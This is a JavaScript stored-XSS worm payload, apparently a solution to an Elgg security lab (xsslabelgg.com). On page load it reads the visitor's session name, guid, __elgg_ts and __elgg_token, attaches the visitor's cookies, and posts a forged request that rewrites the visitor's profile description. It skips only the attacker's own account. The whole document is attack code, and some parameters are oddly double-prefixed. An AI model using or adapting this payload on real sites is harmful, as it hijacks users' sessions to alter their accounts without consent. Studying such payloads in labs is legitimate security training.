            <script id="worm" type="text/javascript">
                    window.onload = function(){
                    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
                    //and Security Token __elgg_token

                    // lets get some session data and store it into variables
                    var userName="&name="+elgg.session.user.name;
                    var guid="&guid="+elgg.session.user.guid;
                    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
                    var token="&__elgg_token="+elgg.security.token.__elgg_token;

                    // the url of the target to post the payload to
                    var sendurl="http://www.xsslabelgg.com/action/profile/edit"


                    var samyGuid="47";
                    if(elgg.session.user.guid!=samyGuid)
                        {
                            //Create and send Ajax request to modify profile
                            var Ajax=null;
                            Ajax=new XMLHttpRequest();
                            Ajax.open("POST",sendurl,true);
                            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                            Ajax.setRequestHeader("Keep-Alive","300");
                            Ajax.setRequestHeader("Connection","keep-alive");
                            Ajax.setRequestHeader("Cookie",document.cookie);
                            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                            Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
                            content ="__elgg_ts="+ts+"&__elgg_token="+token+"&description=this-is-samy-worm-working"+userName+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];
                            Ajax.send(content);
                        }
                    }
            </script>